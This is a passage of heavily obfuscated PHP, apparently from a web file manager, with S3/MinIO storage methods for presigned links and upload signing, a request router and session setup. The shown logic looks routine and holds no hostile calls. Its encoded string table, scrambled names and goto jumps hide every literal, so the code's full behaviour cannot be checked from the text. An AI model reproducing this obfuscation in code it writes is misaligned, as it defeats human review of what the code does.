$this->client->multiUploadObject($ıÈ¹¾¸ô, $this->bucket, trim($Ã«­Ó¶³, $—ğ½œÒ¯[18]), $ÕøÒÏÈ‡, $øÛÌèü); return $–ˆÁ¡È¦ ? $this->getPathOuter($Ã«­Ó¶³) : !1; } public function download($ÓŸÓâŞî, $©–Û¥°ğ) { if (!@is_dir($this->pathFather($©–Û¥°ğ)) && !IO::mkdir($this->pathFather($©–Û¥°ğ))) { return !1; } $Ã©šìğ = $this->client->getObject($this->bucket, $ÓŸÓâŞî, array(), $©–Û¥°ğ); return $Ã©šìğ !== !1 ? $©–Û¥°ğ : !1; } public function link($êµĞàğ, $çØ‚Àôµ = array()) { return $this->getPreSignedURL($êµĞàğ, 3600 * 12, $çØ‚Àôµ); } private function getPreSignedURL($ß”‹¡Ø, $ºÅª±šŠ, $Ù¹è§şµ = array(), $×ïæŒ¦€ = "\107\x45\124") { $²·Ùøê× =& $_SERVER[‰‰Ş‚€]; $ß”‹¡Ø = trim($ß”‹¡Ø, $²·Ùøê×[18]); if ($this->signVer == $²·Ùøê×[258]) { return $this->client->getPreSignedV2URL($this->bucket, $ß”‹¡Ø, $ºÅª±šŠ, $×ïæŒ¦€, $Ù¹è§şµ); } return $this->client->getPreSignedV4URL($this->bucket, $ß”‹¡Ø, $ºÅª±šŠ, array(), $×ïæŒ¦€, $Ù¹è§şµ); } public function fileOut($õÚ¤¨¶È, $Ñ÷ˆÀ²À = false, $§ÅÉêŞÇ = false, $š‘ªìŞÌ = '') { $ÄÉ±Ï¢ =& $_SERVER[‰‰Ş‚€]; if ($this->isFileOutServer()) { return $this->fileOutServer($õÚ¤¨¶È, $Ñ÷ˆÀ²À, $§ÅÉêŞÇ, $š‘ªìŞÌ); } if (!$§ÅÉêŞÇ) { $§ÅÉêŞÇ = $this->pathThis($õÚ¤¨¶È); } $Öş¦ˆ = get_file_mime(get_path_ext($§ÅÉêŞÇ)); if ($Öş¦ˆ == $ÄÉ±Ï¢[259]) { return parent::fileOut($õÚ¤¨¶È, $Ñ÷ˆÀ²À, $§ÅÉêŞÇ, $š‘ªìŞÌ); } $š©Ÿå™’ = array($ÄÉ±Ï¢[260] => $Öş¦ˆ); if ($Ñ÷ˆÀ²À) { $š©Ÿå™’[$ÄÉ±Ï¢[261]] = $ÄÉ±Ï¢[262] . rawurlencode($§ÅÉêŞÇ); } else { } $á‘ıâãó = $this->link($õÚ¤¨¶È, $š©Ÿå™’); $this->fileOutLink($á‘ıâãó); } public function fileOutServer($’“Ü¯¤, $“ñ‰õİ = false, $ßè³ğ¿Ô = false, $çãö¨¿ = '') { parent::fileOut($’“Ü¯¤, $“ñ‰õİ, $ßè³ğ¿Ô, $çãö¨¿); } public function fileOutImageServer($Ä²Éø, $ü•Æ¸â» = 250) { parent::fileOutImage($Ä²Éø, $ü•Æ¸â»); } public function fileOutLink($‰ÆïŒ‚) { $‘€º°Ò =& $_SERVER[‰‰Ş‚€]; if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($‘€º°Ò[77], $‘€º°Ò[76], $‘€º°Ò[78])) && !get_url_scheme($this->endpoint) && substr($‰ÆïŒ‚, 0, 7) == $‘€º°Ò[227]) { $‰ÆïŒ‚ = $‘€º°Ò[228] . substr($‰ÆïŒ‚, 7); } header($‘€º°Ò[183] . $‰ÆïŒ‚); die; } public function hashMd5($¸ÜŸ§„, $ÎÙ¯Áôë = '') { $Ôœšß±¬ = $this->objectMeta($¸ÜŸ§„); if (!$Ôœšß±¬) { return !1; } $ÎÙ¯Áôë = $ÎÙ¯Áôë ? $ÎÙ¯Áôë : _get($Ôœšß±¬, $_SERVER[‰‰Ş‚€][263]); return $ÎÙ¯Áôë; } public function uploadFormData($ºÍä°§¡, $îƒÍ¹Û  = 3600) { $ÉÑ×Æñô =& $_SERVER[‰‰Ş‚€]; if (!$this->_isClientAsync()) { $ÖŠ†–Øö = $this->getPreSignedURL($ºÍä°§¡, $îƒÍ¹Û , array(), $ÉÑ×Æñô[264]); return array($ÉÑ×Æñô[217] => str_replace($ÉÑ×Æñô[227], $ÉÑ×Æñô[265], $ÖŠ†–Øö)); } if (isset($GLOBALS[$ÉÑ×Æñô[16]][$ÉÑ×Æñô[102]][$ÉÑ×Æñô[266]]) && $GLOBALS[$ÉÑ×Æñô[16]][$ÉÑ×Æñô[102]][$ÉÑ×Æñô[266]] == $ÉÑ×Æñô[239]) { return $this->uploadMultiData($ºÍä°§¡, $îƒÍ¹Û ); } if ($this->signVer == $ÉÑ×Æñô[258]) { return $this->uploadFormDataV2($ºÍä°§¡, $îƒÍ¹Û ); } return $this->uploadFormDataV4($ºÍä°§¡, $îƒÍ¹Û ); } public function uploadFormDataV2($ú¾ŠÙº, $Œ×´â¦™ = 3600) { $˜îÎ˜æ =& $_SERVER[‰‰Ş‚€]; $ˆÛ€ğğí = $this->pathFather($ú¾ŠÙº); $Š½£û¼ß = $this->client->getHttpUploadPostParams($this->bucket, $ˆÛ€ğğí, $˜îÎ˜æ[240], $Œ×´â¦™); $ õ£»€ = array_merge((array) $Š½£û¼ß, array($˜îÎ˜æ[267] => $˜îÎ˜æ[258], $˜îÎ˜æ[217] => $this->getHost())); if ($this->_isClientAsync()) { unset($ õ£»€[$˜îÎ˜æ[267]]); } return $ õ£»€; } public function uploadFormDataV4($ˆÆ¡íˆâ, $ó…âæñË = 3600) { $Äğøàßª =& $_SERVER[‰‰Ş‚€]; $ìåÙõıà = $Äğøàßª[240]; $™·ƒ¬¤œ = $Äğøàßª[268]; $³œ†®¼¥ = $Äğøàßª[72]; $ÀıˆÎÈĞ = gmdate($Äğøàßª[269]); $›íÄä«÷ = gmdate($Äğøàßª[270]); $¾¾›ìªë = $Äğøàßª[271]; $¾ºÄÕñ = $ó…âæñË . $Äğøàßª[22]; $Û¬çĞ„§ = $Äğøàßª[272]; $¯ë£®À¸ = array($this->accessKey, $›íÄä«÷, $this->region, $³œ†®¼¥, $¾¾›ìªë); $È ªæ¼è = implode($Äğøàßª[18], $¯ë£®À¸); $–šÌ®²É = array($Äğøàßª[273] => gmdate($Äğøàßª[274], strtotime($Äğøàßª[275])), $Äğøàßª[276] => array(array($Äğøàßª[277] => $this->bucket), array($Äğøàßª[278], $Äğøàßª[279], $Äğøàßª[22]), array($Äğøàßª[278], $Äğøàßª[280], $Äğøàßª[22]), array($Äğøàßª[281] => $Û¬çĞ„§), array($Äğøàßª[282] => $È ªæ¼è), array($Äğøàßª[283] => $™·ƒ¬¤œ), array($Äğøàßª[284] => $ÀıˆÎÈĞ), array($Äğøàßª[285] => $¾ºÄÕñ))); $„È­­áğ = base64_encode(json_encode($–šÌ®²É)); $¾¡°“  = hash_hmac($Äğøàßª[286], $›íÄä«÷, $Äğøàßª[287] . $this->secret, !0); $ª¹›ëÒÆ = hash_hmac($Äğøàßª[286], $this->region, $¾¡°“ , !0); $¦¼Ë„åë = hash_hmac($Äğøàßª[286], $³œ†®¼¥, $ª¹›ëÒÆ, !0); $óÜŸŸş = hash_hmac($Äğøàßª[286], $¾¾›ìªë, $¦¼Ë„åë, !0); $¨ÑËÄşó = hash_hmac($Äğøàßª[286], $„È­­áğ, $óÜŸŸş); $çôÖµ³ş = array($Äğøàßª[257] => $Äğøàßª[22], $Äğøàßª[281] => $Û¬çĞ„§, $Äğøàßª[288] => $„È­­áğ, $Äğøàßª[282] => $È ªæ¼è, $Äğøàßª[283] => $™·ƒ¬¤œ, $Äğøàßª[284] => $ÀıˆÎÈĞ, $Äğøàßª[285] => $¾ºÄÕñ, $Äğøàßª[289] => $¨ÑËÄşó, $Äğøàßª[267] => $Äğøàßª[258], $Äğøàßª[217] => $this->getHost()); if ($this->_isClientAsync()) { unset($çôÖµ³ş[$Äğøàßª[267]]); } return $çôÖµ³ş; } public function uploadMultiData($üÖ¸œû–, $îß¢ßàÓ = 3600) { $ÎÆ»…Å« =& $_SERVER[‰‰Ş‚€]; $­´Ş½Ğ = $this->signVer == $ÎÆ»…Å«[258] ? gmdate($ÎÆ»…Å«[290]) : gmdate($ÎÆ»…Å«[291]); $²¢é²¡š = array(); $–¸Ó¢ = $this->client->getUploadId($this->bucket, $üÖ¸œû–, $²¢é²¡š); if (!$–¸Ó¢) { return !1; } $æâÚ®®ı = array($ÎÆ»…Å«[292] => $–¸Ó¢, $ÎÆ»…Å«[217] => $this->getHost() . $ÎÆ»…Å«[18] . $this->pathEncode($üÖ¸œû–), $ÎÆ»…Å«[293] => $­´Ş½Ğ, $ÎÆ»…Å«[105] => $üÖ¸œû–, $ÎÆ»…Å«[267] => $this->signVer); if ($this->_isClientAsync()) { unset($æâÚ®®ı[$ÎÆ»…Å«[267]]); } return $æâÚ®®ı; } public function uploadMultiAuth($Ğ¸øàÊú, $£«´ø¯º = array()) { $—Š÷ä¹ =& $_SERVER[‰‰Ş‚€]; if ($this->signVer == $—Š÷ä¹[258]) { if (isset($£«´ø¯º[$—Š÷ä¹[294]])) { return $this->uploadPartAuthV2($Ğ¸øàÊú, $£«´ø¯º); } return $this->uploadListAuthV2($Ğ¸øàÊú, $£«´ø¯º); } if (isset($£«´ø¯º[$—Š÷ä¹[294]])) { return $this->uploadPartAuthV4($Ğ¸øàÊú, $£«´ø¯º); } return $this->uploadListAuthV4($Ğ¸øàÊú, $£«´ø¯º); } public function uploadPartAuthV2($§ò†ß¦Ş, $…ÍïşÜ = array()) { $‹ëìÄ¨„ =& $_SERVER[‰‰Ş‚€]; $¬ÖÙ­… = $…ÍïşÜ[$‹ëìÄ¨„[105]]; $ò«á´œ” = gmdate($‹ëìÄ¨„[290]); $ßÚÃÅãª = array_intersect_key($…ÍïşÜ, array_flip(array($‹ëìÄ¨„[294], $‹ëìÄ¨„[292]))); ksort($ßÚÃÅãª); $ˆÍ—¼ã‹ = $ßÚÃÅãª ? $‹ëìÄ¨„[86] . http_build_query($ßÚÃÅãª, null, $‹ëìÄ¨„[295], PHP_QUERY_RFC3986) : $‹ëìÄ¨„[22]; $âÕÏ± = array($‹ëìÄ¨„[264], $‹ëìÄ¨„[22], $‹ëìÄ¨„[131], $‹ëìÄ¨„[22], "\170\x2d\x61\x6d\x7a\x2d\144\x61\164\145\72{$ò«á´œ”}", $‹ëìÄ¨„[18] . $this->bucket . $‹ëìÄ¨„[18] . $this->pathEncode($¬ÖÙ­…) . $ˆÍ—¼ã‹); $êŠ¼±ú§ = implode($‹ëìÄ¨„[10], $âÕÏ±); $ÙÌÄ = $this->client->__getSignature($êŠ¼±ú§); return array($‹ëìÄ¨„[296] => $ÙÌÄ, $‹ëìÄ¨„[293] => $ò«á´œ”); } public function uploadListAuthV2($ÙÛƒîÔ, $ÒØ¡™µ„ = array()) { $…‹«¥ÄÀ =& $_SERVER[‰‰Ş‚€]; $Òü‘á¶î = $ÒØ¡™µ„[$…‹«¥ÄÀ[105]]; $ììê’‰í = $ÒØ¡™µ„[$…‹«¥ÄÀ[292]]; $¹´®Ş = $this->client->listParts($this->bucket, $Òü‘á¶î, $ììê’‰í); if (!$¹´®Ş) { return !1; } $‘½€ÔÌÈ = gmdate($…‹«¥ÄÀ[290]); $ÛÛş‚°ê = $…‹«¥ÄÀ[297] . $ììê’‰í; $ÏÉÇÇ®À = array($…‹«¥ÄÀ[298], $…‹«¥ÄÀ[22], $…‹«¥ÄÀ[131], $…‹«¥ÄÀ[22], "\x78\55\x61\155\x7a\x2d\x64\141\x74\x65\x3a{$‘½€ÔÌÈ}", $…‹«¥ÄÀ[18] . $this->bucket . $…‹«¥ÄÀ[18] . $this->pathEncode($Òü‘á¶î) . $ÛÛş‚°ê); $ÃÎ’ºì® = implode($…‹«¥ÄÀ[10], $ÏÉÇÇ®À); $üü¯å±í = $this->client->__getSignature($ÃÎ’ºì®); return array($…‹«¥ÄÀ[296] => $üü¯å±í, $…‹«¥ÄÀ[293] => $‘½€ÔÌÈ, $…‹«¥ÄÀ[299] => $¹´®Ş); } public function uploadPartAuthV4($¨éİ®–¿, $¿ÕŒ¡¤¹ = array()) { $»åó©Öò =& $_SERVER[‰‰Ş‚€]; $‹åûŠ = $¿ÕŒ¡¤¹[$»åó©Öò[105]]; $ÖäÛ½ôÜ = array($»åó©Öò[284] => gmdate($»åó©Öò[291]), $»åó©Öò[300] => _get($¿ÕŒ¡¤¹, $»åó©Öò[301], hash($»åó©Öò[286], $»åó©Öò[22]))); $»¨² Õ = explode($»åó©Öò[219], $this->getHost()); $Œ«ó¥å = array($»åó©Öò[302] => $»¨² Õ[1], $»åó©Öò[303] => $»åó©Öò[22], $»åó©Öò[257] => $»åó©Öò[131], $»åó©Öò[304] => $¿ÕŒ¡¤¹[$»åó©Öò[89]]); $‹½å²°ô = $»åó©Öò[264]; $¶óö‰“ = $»åó©Öò[18] . $this->pathEncode($‹åûŠ); $ºôò€ˆ† = array_intersect_key($¿ÕŒ¡¤¹, array_flip(array($»åó©Öò[294], $»åó©Öò[292]))); $á·ò«† = $this->client->__getSignatureV4($ÖäÛ½ôÜ, $Œ«ó¥å, $‹½å²°ô, $¶óö‰“, $ºôò€ˆ†); return array($»åó©Öò[296] => $á·ò«†, $»åó©Öò[300] => $ÖäÛ½ôÜ[$»åó©Öò[300]], $»åó©Öò[293] => $ÖäÛ½ôÜ[$»åó©Öò[284]]); } public function uploadListAuthV4($šï˜ıçé, $åµÎ¹¡ = array()) { $ÒÃ¶¶ë =& $_SERVER[‰‰Ş‚€]; $õ¯İï”õ = $åµÎ¹¡[$ÒÃ¶¶ë[105]]; $üñå‘ = $åµÎ¹¡[$ÒÃ¶¶ë[292]]; $ôÌ¦µÙ = $this->client->listParts($this->bucket, $õ¯İï”õ, $üñå‘); if (!$ôÌ¦µÙ) { return !1; } $îÏ”±­Ô = $ÒÃ¶¶ë[305]; foreach ($ôÌ¦µÙ as $ş€Ø„Â«) { $îÏ”±­Ô .= $ÒÃ¶¶ë[306] . "\74\120\x61\162\164\116\x75\155\x62\x65\x72\x3e{$ş€Ø„Â«[$ÒÃ¶¶ë[307]]}\74\x2f\x50\x61\x72\x74\x4e\x75\x6d\x62\x65\162\x3e\12" . "\74\x45\x54\x61\x67\x3e{$ş€Ø„Â«[$ÒÃ¶¶ë[308]]}\x3c\x2f\x45\x54\141\x67\76\12" . $ÒÃ¶¶ë[309]; } $îÏ”±­Ô .= $ÒÃ¶¶ë[310]; $÷ºïßÅé = array($ÒÃ¶¶ë[284] => gmdate($ÒÃ¶¶ë[291]), $ÒÃ¶¶ë[300] => hash($ÒÃ¶¶ë[286], $îÏ”±­Ô)); $©àË˜æ½ = explode($ÒÃ¶¶ë[219], $this->getHost()); $ÄÄÅ›Ë‡ = array($ÒÃ¶¶ë[302] => $©àË˜æ½[1], $ÒÃ¶¶ë[257] => $ÒÃ¶¶ë[131], $ÒÃ¶¶ë[304] => strlen($îÏ”±­Ô)); $ÙÓ¤‹¼¥ = $ÒÃ¶¶ë[298]; $¶‡ª¸ö• = $ÒÃ¶¶ë[18] . $this->pathEncode($õ¯İï”õ); $«ü®áİÓ = array($ÒÃ¶¶ë[292] => $üñå‘); $€ø¨ÛŸ = $this->client->__getSignatureV4($÷ºïßÅé, $ÄÄÅ›Ë‡, $ÙÓ¤‹¼¥, $¶‡ª¸ö•, $«ü®áİÓ); return array($ÒÃ¶¶ë[296] => $€ø¨ÛŸ, $ÒÃ¶¶ë[300] => $÷ºïßÅé[$ÒÃ¶¶ë[300]], $ÒÃ¶¶ë[293] => $÷ºïßÅé[$ÒÃ¶¶ë[284]], $ÒÃ¶¶ë[299] => $ôÌ¦µÙ); } private function _isClientAsync() { $Æ±†ğ™« =& $_SERVER[‰‰Ş‚€]; static $ñÎ¶ñƒ = null; if ($ñÎ¶ñƒ === null) { $á—‹üñã = isset($_REQUEST[$Æ±†ğ™«[311]]) ? json_decode($_REQUEST[$Æ±†ğ™«[311]], !0) : !1; $ñÎ¶ñƒ = $á—‹üñã && _get($á—‹üñã, $Æ±†ğ™«[312]) == $Æ±†ğ™«[313]; } return $ñÎ¶ñƒ; } public function getHost() { $‰¡·¸ìÇ =& $_SERVER[‰‰Ş‚€]; $çé•§Õò = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($‰¡·¸ìÇ[80], $‰¡·¸ìÇ[74], $‰¡·¸ìÇ[79], $‰¡·¸ìÇ[72]))) { return $çé•§Õò . $‰¡·¸ìÇ[18] . $this->bucket; } if ($this->osType == $‰¡·¸ìÇ[72] && !is_domain($çé•§Õò)) { return $çé•§Õò . $‰¡·¸ìÇ[18] . $this->bucket; } $çé•§Õò = explode($‰¡·¸ìÇ[219], $çé•§Õò); return $çé•§Õò[0] . $‰¡·¸ìÇ[219] . $this->bucket . $‰¡·¸ìÇ[20] . $çé•§Õò[1]; } public function size($“ø•éêœ) { $º¢æÅğ— = $this->objectMeta($“ø•éêœ); return $º¢æÅğ— ? $º¢æÅğ—[$_SERVER[‰‰Ş‚€][89]] : 0; } public function info($Ò¶ŞéÏÁ) { if ($this->isFolder($Ò¶ŞéÏÁ)) { return $this->folderInfo($Ò¶ŞéÏÁ); } else { if ($this->isFile($Ò¶ŞéÏÁ)) { return $this->fileInfo($Ò¶ŞéÏÁ); } } return !1; } public function exist($ËÏ½ŒÎ) { return $this->isFile($ËÏ½ŒÎ) || $this->isFolder($ËÏ½ŒÎ); } public function isFile($‘İÄŸğÚ) { return !$this->isFolder($‘İÄŸğÚ) && $this->objectMeta($‘İÄŸğÚ); } public function isFolder($Àáç¬ú) { return $this->cacheMethod($_SERVER[‰‰Ş‚€][188], $Àáç¬ú); } protected function objectMeta($úÚ‘èÖÖ) { return $this->cacheMethod($_SERVER[‰‰Ş‚€][190], $úÚ‘èÖÖ); } protected function _objectMeta($ÆÅ—Ñ¯) { $ÆŒËç—á =& $_SERVER[‰‰Ş‚€]; $ÆÅ—Ñ¯ = rtrim($ÆÅ—Ñ¯, $ÆŒËç—á[18]); try { $“«È¾…Ğ = $this->client->getObjectInfo($this->bucket, $ÆÅ—Ñ¯); if (!isset($“«È¾…Ğ[$ÆŒËç—á[263]]) && isset($“«È¾…Ğ[$ÆŒËç—á[314]])) { $“«È¾…Ğ[$ÆŒËç—á[263]] = $“«È¾…Ğ[$ÆŒËç—á[314]]; } } catch (Exception $¦òµºú×) { $“«È¾…Ğ = !1; } if (!$“«È¾…Ğ) { } return $“«È¾…Ğ; } protected function _isFolder($˜ïæ¶¹¤) { $ŒäÒµµ =& $_SERVER[‰‰Ş‚€]; $˜ïæ¶¹¤ = rtrim($˜ïæ¶¹¤, $ŒäÒµµ[18]) . $ŒäÒµµ[18]; if ($˜ïæ¶¹¤ == $ŒäÒµµ[22] || $˜ïæ¶¹¤ == $ŒäÒµµ[18]) { return !0; } $ÎÈæÂèÌ = $this->client->getBucket($this->bucket, $˜ïæ¶¹¤, null, 1); if (empty($ÎÈæÂèÌ[$ŒäÒµµ[247]])) { return !1; } $‰¢¨´ªÚ = $ÎÈæÂèÌ[$ŒäÒµµ[247]][0][$ŒäÒµµ[42]]; return stripos($‰¢¨´ªÚ, $˜ïæ¶¹¤) === 0 ? !0 : !1; if (substr($‰¢¨´ªÚ, -1) == $ŒäÒµµ[18]) { return !0; } if (get_path_this($‰¢¨´ªÚ) == get_path_this($˜ïæ¶¹¤)) { return !1; } return !0; } public function listObject($˜ÉéàÜ­) { return $this->fileList($˜ÉéàÜ­, $_SERVER[‰‰Ş‚€][22], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($µÉ›Ÿş—) { $¬æ¯ùªµ =& $_SERVER[‰‰Ş‚€]; parent::__construct($µÉ›Ÿş—); $this->setSignVersion($¬æ¯ùªµ[258]); if (!$this->region) { $this->region = $¬æ¯ùªµ[315]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $âÌş§Î = $this->getBktRegion(); return $this->region == $âÌş§Î ? !0 : !1; } public function uploadFormData($î÷²‹ÚÕ, $–¥£×Û³ = 3600) { $ÂíÓ¿Õ¬ =& $_SERVER[‰‰Ş‚€]; $şÑ‘¹Ğ = $ÂíÓ¿Õ¬[240]; $Êú¾È±ñ = $ÂíÓ¿Õ¬[268]; $ŠÒ‘“– = $ÂíÓ¿Õ¬[72]; $İú†íù¥ = gmdate($ÂíÓ¿Õ¬[269]); $Ôˆú­ = gmdate($ÂíÓ¿Õ¬[270]); $×²³Šè = $ÂíÓ¿Õ¬[271]; $‰‘âúã£ = $–¥£×Û³ . $ÂíÓ¿Õ¬[22]; $‚Ìï„ = $ÂíÓ¿Õ¬[272]; $”ÆÆöÄ¤ = array($this->accessKey, $Ôˆú­, $this->region, $ŠÒ‘“–, $×²³Šè); $É ›‹»Ÿ = implode($ÂíÓ¿Õ¬[18], $”ÆÆöÄ¤); $Ç±ûÙ× = array($ÂíÓ¿Õ¬[273] => gmdate($ÂíÓ¿Õ¬[274], strtotime($ÂíÓ¿Õ¬[275])), $ÂíÓ¿Õ¬[276] => array(array($ÂíÓ¿Õ¬[277] => $this->bucket), array($ÂíÓ¿Õ¬[316] => $şÑ‘¹Ğ), array($ÂíÓ¿Õ¬[278], $ÂíÓ¿Õ¬[279], $ÂíÓ¿Õ¬[22]), array($ÂíÓ¿Õ¬[278], $ÂíÓ¿Õ¬[280], $ÂíÓ¿Õ¬[22]), array($ÂíÓ¿Õ¬[278], $ÂíÓ¿Õ¬[317], $ÂíÓ¿Õ¬[22]), array($ÂíÓ¿Õ¬[281] => $‚Ìï„), array($ÂíÓ¿Õ¬[282] => $É ›‹»Ÿ), array($ÂíÓ¿Õ¬[283] => $Êú¾È±ñ), array($ÂíÓ¿Õ¬[284] => $İú†íù¥), array($ÂíÓ¿Õ¬[285] => $‰‘âúã£))); $Û¶¼²Î£ = base64_encode(json_encode($Ç±ûÙ×)); $øÍÃí»ó = hash_hmac($ÂíÓ¿Õ¬[286], $Ôˆú­, $ÂíÓ¿Õ¬[287] . $this->secret, !0); $è§Ş“ = hash_hmac($ÂíÓ¿Õ¬[286], $this->region, $øÍÃí»ó, !0); $°´¾¿² = hash_hmac($ÂíÓ¿Õ¬[286], $ŠÒ‘“–, $è§Ş“, !0); $à¢®ş¿ = hash_hmac($ÂíÓ¿Õ¬[286], $×²³Šè, $°´¾¿², !0); $©ÁåİÎ = hash_hmac($ÂíÓ¿Õ¬[286], $Û¶¼²Î£, $à¢®ş¿); $±¥» ™ç = array($ÂíÓ¿Õ¬[257] => $ÂíÓ¿Õ¬[22], $ÂíÓ¿Õ¬[304] => $ÂíÓ¿Õ¬[22], $ÂíÓ¿Õ¬[316] => $şÑ‘¹Ğ, $ÂíÓ¿Õ¬[281] => $‚Ìï„, $ÂíÓ¿Õ¬[288] => $Û¶¼²Î£, $ÂíÓ¿Õ¬[318] => $É ›‹»Ÿ, $ÂíÓ¿Õ¬[319] => $Êú¾È±ñ, $ÂíÓ¿Õ¬[320] => $İú†íù¥, $ÂíÓ¿Õ¬[321] => $‰‘âúã£, $ÂíÓ¿Õ¬[322] => $©ÁåİÎ, $ÂíÓ¿Õ¬[217] => $this->getHost()); return $±¥» ™ç; } } goto b—ïË´¶óœ; F‹„šñÈàÀ: define($_SERVER[‰‰Ş‚€][0], $_SERVER[‰‰Ş‚€][1]); $_SERVER[´¶››·] = explode($_SERVER[‰‰Ş‚€][2], gzinflate(substr($_SERVER[‰‰Ş‚€][3], 10, -8))); function binCheckEq($½Û¢Î‚¥, $ô¾ÇŒöÊ) { return $½Û¢Î‚¥ == $ô¾ÇŒöÊ; } goto DäìÍğËá; eˆµÌšˆ¦™: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\156\x79" => "\133\136\x2f\x5d\x2b", "\x3a\156\165\155" => "\133\60\x2d\71\135\53", "\x3a\141\x6c\154" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($ï¹Ÿ•ñæ, $úÄ÷Õ–‰) { $¥Êáî˜â =& $_SERVER[‰‰Ş‚€]; if ($ï¹Ÿ•ñæ == $¥Êáî˜â[1755]) { $ŒßÁÏÅ‡ = array_map($¥Êáî˜â[1756], $úÄ÷Õ–‰[0]); $€É©ó›Ã = strpos($úÄ÷Õ–‰[1], $¥Êáî˜â[18]) === 0 ? $úÄ÷Õ–‰[1] : $¥Êáî˜â[18] . $úÄ÷Õ–‰[1]; $ï•âš“ = $úÄ÷Õ–‰[2]; } else { $ŒßÁÏÅ‡ = null; $€É©ó›Ã = strpos($úÄ÷Õ–‰[0], $¥Êáî˜â[18]) === 0 ? $úÄ÷Õ–‰[0] : $¥Êáî˜â[18] . $úÄ÷Õ–‰[0]; $ï•âš“ = $úÄ÷Õ–‰[1]; } array_push(self::$maps, $ŒßÁÏÅ‡); array_push(self::$routes, $€É©ó›Ã); array_push(self::$methods, strtoupper($ï¹Ÿ•ñæ)); array_push(self::$callbacks, $ï•âš“); } public static function error($ÕĞüÜëÉ) { self::$errorCallback = $ÕĞüÜëÉ; } public static function haltOnMatch($¼·ä—‹Ş = true) { self::$halts = $¼·ä—‹Ş; } public static function dispatch() { $‡•¾È½Á =& $_SERVER[‰‰Ş‚€]; $Å´ß…úû = parse_url($_SERVER[$‡•¾È½Á[1757]], PHP_URL_PATH); $§¶ˆ²ô = $_SERVER[$‡•¾È½Á[172]]; $€¥öÜò° = array_keys(static::$patterns); $ºèÃµ°û = array_values(static::$patterns); $˜ßÀƒ  = !1; self::$routes = preg_replace($‡•¾È½Á[1400], $‡•¾È½Á[18], self::$routes); if (in_array($Å´ß…úû, self::$routes)) { $¶ü¤’ö§ = array_keys(self::$routes, $Å´ß…úû); foreach ($¶ü¤’ö§ as $Éßùˆ‡—) { if (self::$methods[$Éßùˆ‡—] == $§¶ˆ²ô || self::$methods[$Éßùˆ‡—] == $‡•¾È½Á[1758] || in_array($§¶ˆ²ô, self::$maps[$Éßùˆ‡—])) { $˜ßÀƒ  = !0; if (!is_object(self::$callbacks[$Éßùˆ‡—])) { $¸‹¨²ÉŞ = explode($‡•¾È½Á[18], self::$callbacks[$Éßùˆ‡—]); $¹Õ¹ÚÈÕ = end($¸‹¨²ÉŞ); $šìşû¬ = explode($‡•¾È½Á[1332], $¹Õ¹ÚÈÕ); $¸Š•ÉŸæ = new $šìşû¬[0](); $¸Š•ÉŸæ->{$šìşû¬[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$Éßùˆ‡—]); if (self::$halts) { return; } } } } } else { $«Şô›ì› = 0; foreach (self::$routes as $Éßùˆ‡—) { if (strpos($Éßùˆ‡—, $‡•¾È½Á[14]) !== !1) { $Éßùˆ‡— = str_replace($€¥öÜò°, $ºèÃµ°û, $Éßùˆ‡—); } if (preg_match($‡•¾È½Á[1759] . $Éßùˆ‡— . $‡•¾È½Á[1760], $Å´ß…úû, $½ÀŸÚ²³)) { if (self::$methods[$«Şô›ì›] == $§¶ˆ²ô || self::$methods[$«Şô›ì›] == $‡•¾È½Á[1758] || !empty(self::$maps[$«Şô›ì›]) && in_array($§¶ˆ²ô, self::$maps[$«Şô›ì›])) { $˜ßÀƒ  = !0; array_shift($½ÀŸÚ²³); if (!is_object(self::$callbacks[$«Şô›ì›])) { $¸‹¨²ÉŞ = explode($‡•¾È½Á[18], self::$callbacks[$«Şô›ì›]); $¹Õ¹ÚÈÕ = end($¸‹¨²ÉŞ); $šìşû¬ = explode($‡•¾È½Á[1332], $¹Õ¹ÚÈÕ); $¸Š•ÉŸæ = new $šìşû¬[0](); if (!method_exists($¸Š•ÉŸæ, $šìşû¬[1])) { echo $‡•¾È½Á[1761]; } else { call_user_func_array(array($¸Š•ÉŸæ, $šìşû¬[1]), $½ÀŸÚ²³); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$«Şô›ì›], $½ÀŸÚ²³); if (self::$halts) { return; } } } } $«Şô›ì›++; } } if ($˜ßÀƒ  == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $Ì¹Éòá =& $_SERVER[‰‰Ş‚€]; header($_SERVER[$Ì¹Éòá[1762]] . $Ì¹Éòá[1763]); echo $Ì¹Éòá[1764]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$‡•¾È½Á[1757]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $®ğÌµù =& $_SERVER[‰‰Ş‚€]; static $šùñÒÂ = false; if ($šùñÒÂ) { return $šùñÒÂ; } $Ö¹Ã“ø¤ = $GLOBALS[$®ğÌµù[16]][$®ğÌµù[433]]; self::$sessionTime = $Ö¹Ã“ø¤[$®ğÌµù[1765]]; $ÁòäñÊš = isset($GLOBALS[$®ğÌµù[1766]]) ? $GLOBALS[$®ğÌµù[1766]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($ÁòäñÊš)) { self::$sessionSign = Cookie::get($ÁòäñÊš); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($ÁòäñÊš, self::$sessionSign, self::$sessionTime); $ÀŠŠÃÇ© = $Ö¹Ã“ø¤[$®ğÌµù[1767]]; $ş¯ĞÕ = $Ö¹Ã“ø¤[$ÀŠŠÃÇ©]; $™’Ôú¢ = $Ö¹Ã“ø¤[$®ğÌµù[932]]; switch ($ÀŠŠÃÇ©) { case $®ğÌµù[31]: self::$handle = Model($®ğÌµù[933]); break; case $®ğÌµù[934]: self::$handle = new CacheRedis($ş¯ĞÕ, $™’Ôú¢); break; case $®ğÌµù[935]: self::$handle = new CacheMemcached($ş¯ĞÕ, $™’Ôú¢); break; case 